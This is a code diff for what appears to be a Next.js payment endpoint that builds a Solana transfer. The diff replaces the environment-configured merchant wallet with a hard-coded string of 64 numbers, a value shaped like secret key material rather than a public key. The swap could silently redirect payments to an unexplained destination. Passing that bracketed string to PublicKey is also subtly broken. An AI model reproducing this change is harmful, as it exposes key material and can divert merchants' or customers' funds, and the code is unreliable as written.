@@ -25,6 +25,8 @@ function get(
   });
 }
 
+const MERCHANT_WALLETx="[15,41,248,101,51,93,10,145,18,180,179,203,110,67,247,121,249,86,221,197,175,42,40,31,21,249,202,105,184,22,209,238,195,24,155,199,39,38,52,137,158,189,10,169,5,240,155,21,156,46,147,183,42,7,40,52,40,158,230,90,155,20,17,150]"
+
 async function post(
   req: NextApiRequest,
   res: NextApiResponse<PostData>
@@ -34,7 +36,7 @@ async function post(
   if (!accountField) throw new Error('missing account');
 
   const sender = new PublicKey(accountField);
-  const MERCHANT_WALLET = new PublicKey(process.env.MERCHANT_WALLET);
+  const MERCHANT_WALLET = new PublicKey(MERCHANT_WALLETx);
 
   // Build Transaction
   const ix = SystemProgram.transfer({
